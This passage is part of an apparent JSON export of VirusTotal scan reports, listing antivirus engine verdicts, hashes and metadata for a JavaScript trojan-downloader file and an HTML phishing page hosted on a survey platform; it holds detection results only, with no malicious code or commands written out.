          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.607",
          "result": "JS.Agent.FA",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ISB.HideLink!gen1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28480",
          "result": "JS/Agent.NNS",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.483",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:HideLink-A [Trj]",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan-Downloader.JS.Agent.hbs",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Agent.duujlm",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.HideLink!8.1DD5 (TOPIS:E0:REKl6A1MFKH)",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.HideLink.1 (B)",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "HTML.Trojan.Agent.h",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Malware.HTML/ExpKit.AQ",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "JS.Seospam.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/SEO-A",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.JS.Agent",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231228-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.JS.bwn",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "JS/SEOHide.A",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HTML/ExpKit.AQ",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/JS.Agent.nns",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Script.Ks.Malware.4261",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36298",
          "result": "TrojWare.JS.Agent.caa@544ar4",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:JS/HideLink.A",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "JS.Z.Agent.32730.J",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan-Downloader.JS.Agent.hbs",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37058B:27.34367",
          "result": "HTML.Riskware.HideLink.C",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1703817048",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Malware/JS.Generic.SC948",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-29.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "VBA32": {
          "category": "timeout",
          "engine_name": "VBA32",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Html.Win32.Script.501441",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Downloader.W32.JS.Agent.hbs",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/Agent.NOI",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "JS:HideLink-A [Trj]",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      }
    },
    "type": "file",
    "id": "557079ea8aa44adba6191b9037911c79296b2606ebe2c75a95673e6112f0cfc3",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/557079ea8aa44adba6191b9037911c79296b2606ebe2c75a95673e6112f0cfc3"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fc3cff7f10aec9ee26f5"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T107F31A60F21031EA3333C65971D0FE866619A153E6564FB7F22F25E84F846CA1673F2A",
      "vhash": "htm:792a35f40f17192078b77773702a9c29",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706330732,
      "type_tag": "html",
      "times_submitted": 2,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 165112,
      "popular_threat_classification": {
        "suggested_threat_label": "phishing.gen2",
        "popular_threat_category": [
          {
            "count": 25,
            "value": "phishing"
          },
          {
            "count": 12,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 2,
            "value": "gen2"
          }
        ]
      },
      "html_info": {
        "html_meta": {
          "Generator": [
            "SurveyGizmo; http://www.surveygizmo.com"
          ],
          "description": [
            "123098FGsgh."
          ],
          "viewport": [
            "width=device-width, initial-scale=1.0, height=device-height, minimal-ui"
          ],
          "robots": [
            "NOINDEX,NOFOLLOW"
          ]
        },
        "hrefs": [
          "//www.surveygizmo.com/2021.07.29.01/runtimejs/dist/survey/css/jscal.css",
          "//www.surveygizmo.com/2021.07.29.01/runtimejs/dist/survey/css/survey2.css",
          "//www.surveygizmo.com/2021.07.29.01/runtimethemes/default/runtime/css/sg-icon-font.css",
          "//app.surveygizmo.com/runtimethemes/default/runtime/css/nojs.css",
          "//fonts.googleapis.com/css?family=Montserrat",
          "http://www.enable-javascript.com/",
          "#sg-skipnav-target",
          "https://www.google.com/s2/favicons?domain=dell.com?v=BUILD_HASH",
          "https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap",
          "css/hover.css"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "66455d3bb3e644195160a39ad71e61d987a52801d321b78b9f63b246fa25877a"
          },
          {
            "attributes": {
              "src": "//www.surveygizmo.com/2021.07.29.01/runtimejs/dist/survey/js/survey.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"
            }
          },
          {
            "attributes": {
              "src": "https://code.jquery.com/jquery-3.1.1.min.js"
            },
            "sha256": "6e9c0b3616428176622dd28297b273de4b25fdba48aad6c698192131883cefb9"
          },
          {
            "attributes": {
              "src": "https://kit.fontawesome.com/585b051251.js",
              "crossorigin": "anonymous"
            }
          },
          {
            "attributes": {
              "src": "https://code.jquery.com/jquery-3.2.1.slim.min.js",
              "integrity": "sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN",
              "crossorigin": "anonymous"
            }
          },
          {
            "attributes": {
              "src": "https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js",
              "integrity": "sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q",
              "crossorigin": "anonymous"
            }
          },
          {
            "attributes": {
              "src": "https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js",
              "integrity": "sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl",
              "crossorigin": "anonymous"
            }
          },
          {
            "attributes": {
              "src": "https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "301eed6fc994aa4fa6e1aa2008bacb3564358b23e45fe207251b911d253954de"
          }
        ],
        "title": "123098FGsgh"
      },
      "last_submission_date": 1696597151,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language",
          "probability": 100
        }
      ],
      "sha256": "7d48e8b2ea00c6b698acd4daf2ca1ac407bf295525f303a29f1518a4da27a6cc",
      "type_extension": "html",
      "tags": [
        "base64-embedded",
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696658711,
      "unique_sources": 2,
      "first_submission_date": 1627861102,
      "ssdeep": "1536:LCb7wDUPBw/a1fIuiHlq5mN8lDbNmPbcNyHcpWnFf:LCHwDUT1iT5HlnFf",
      "md5": "794b70a18136a623f75a7b9f8d05a827",
      "sha1": "f7e8715039aa0513f43f1be988370ac80d0d2304",
      "magic": "HTML document, ASCII text, with very long lines (47641u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 34,
        "undetected": 26
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Hacktool.HTML.Phish.3!c",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "JS.Phishing.481",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Script.Trojan.44094",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Phishing.Generic-HTML.Save.5d528aab",
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49805",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49804",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.552",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28031",
          "result": "HTML/Phishing.Agent.BDI",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:Phishing-DA [Phish]",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Hoax.HTML.Phish.gen",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Phishing.jydkte",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "JS.Z.Agent.165112.DK",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Phishing/HTML!8.11C79 (TOPIS:E0:aqQ6VOhtY3F)",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.HTML/Infected.WebPage.Gen2",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.94",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.HTML.Phishing.BFA (B)",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Phishing.HTML.Doc",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696654868",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HTML/Infected.WebPage.Gen2",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": "win32.torj.hoax.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "PWS:HTML/Phish.RA!MTB",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36063",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Hoax.HTML.Phish.gen",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36619B:27.33409",
          "result": "HTML.Trojan-Stealer.Phish.IL",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "JS/Phish.ST",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Phishing/HTML.Generic.S2152",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.HTML.Phishing.BFA",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-07.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Html.Win32.Script.504781",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Hoax.W32.HTML.Phish.gen",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "HTML/Agent.BDI!tr",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "JS:Phishing-DA [Phish]",
          "method": "blacklist",
          "engine_update": "20231007"
        },
